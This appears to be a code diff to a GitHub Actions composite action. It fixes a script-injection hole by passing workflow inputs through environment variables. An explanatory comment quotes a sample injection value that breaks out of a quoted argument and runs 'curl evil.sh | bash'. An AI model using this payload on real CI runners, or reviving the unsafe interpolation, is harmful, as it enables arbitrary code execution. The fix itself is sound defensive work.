@@ -65,17 +65,36 @@ runs:
   steps:
     - id: audit
       shell: bash
+      # Every input a workflow author might reasonably feed from something
+      # they don't fully control — a PR-derived URL, a preview-deploy link —
+      # goes through env, never spliced with ${{ inputs.x }} straight into the
+      # script text. GitHub substitutes ${{ }} expressions before bash ever
+      # sees the script, so a value containing a `"` or `)` doesn't arrive as
+      # a shell argument, it arrives as more script: `url: 'https://a.test/")
+      # ; curl evil.sh | bash ; args=("dummy'` ran arbitrary commands on the
+      # runner. This was proven, not assumed: substituting that exact string
+      # the way runAction() in test/action.test.js does created a file that
+      # only a genuinely executed `touch` could have created. `key` already
+      # used this safe pattern; the rest did not.
       env:
         CITABLE_KEY: ${{ inputs.key }}
+        CITABLE_ACTION_URL: ${{ inputs.url }}
+        CITABLE_ACTION_SITE: ${{ inputs.site }}
+        CITABLE_ACTION_LIMIT: ${{ inputs.limit }}
+        CITABLE_ACTION_REPORT: ${{ inputs.report }}
+        CITABLE_ACTION_BASELINE: ${{ inputs.baseline }}
+        CITABLE_ACTION_FAIL_ON_REGRESSION: ${{ inputs.fail-on-regression }}
+        CITABLE_ACTION_MIN_SCORE: ${{ inputs.min-score }}
+        CITABLE_ACTION_FAIL_ON: ${{ inputs.fail-on }}
       run: |
         set -o pipefail
-        args=("${{ inputs.url }}" --json --no-color)
-        [ "${{ inputs.site }}" = "true" ] && args+=(--site --limit "${{ inputs.limit }}")
-        [ -n "${{ inputs.report }}" ] && args+=(--report "${{ inputs.report }}")
-        [ -n "${{ inputs.baseline }}" ] && args+=(--baseline "${{ inputs.baseline }}")
-        [ "${{ inputs.fail-on-regression }}" = "true" ] && args+=(--fail-on-regression)
-        [ -n "${{ inputs.min-score }}" ] && args+=(--min-score "${{ inputs.min-score }}")
-        [ -n "${{ inputs.fail-on }}" ] && args+=(--fail-on "${{ inputs.fail-on }}")
+        args=("$CITABLE_ACTION_URL" --json --no-color)
+        [ "$CITABLE_ACTION_SITE" = "true" ] && args+=(--site --limit "$CITABLE_ACTION_LIMIT")
+        [ -n "$CITABLE_ACTION_REPORT" ] && args+=(--report "$CITABLE_ACTION_REPORT")
+        [ -n "$CITABLE_ACTION_BASELINE" ] && args+=(--baseline "$CITABLE_ACTION_BASELINE")
+        [ "$CITABLE_ACTION_FAIL_ON_REGRESSION" = "true" ] && args+=(--fail-on-regression)
+        [ -n "$CITABLE_ACTION_MIN_SCORE" ] && args+=(--min-score "$CITABLE_ACTION_MIN_SCORE")
+        [ -n "$CITABLE_ACTION_FAIL_ON" ] && args+=(--fail-on "$CITABLE_ACTION_FAIL_ON")
 
         node "${{ github.action_path }}/bin/citable.js" "${args[@]}" > citable-result.json || status=$?
         # Read from stdin so this works whether the action package resolves as
@@ -85,7 +104,7 @@ runs:
         read -r score regressed <<< "$(node -e 'let s="";process.stdin.on("data",d=>{s+=d}).on("end",()=>{const r=JSON.parse(s);console.log((r.currentScore??r.score??r.averageScore??0)+" "+(r.regressed===true))})' < citable-result.json)"
         echo "score=$score" >> "$GITHUB_OUTPUT"
         echo "regressed=$regressed" >> "$GITHUB_OUTPUT"
-        if [ -n "${{ inputs.baseline }}" ]; then
+        if [ -n "$CITABLE_ACTION_BASELINE" ]; then
           # Render the comparison into the job summary so reviewers see what
           # changed without opening the artifact.
           node --input-type=module -e '
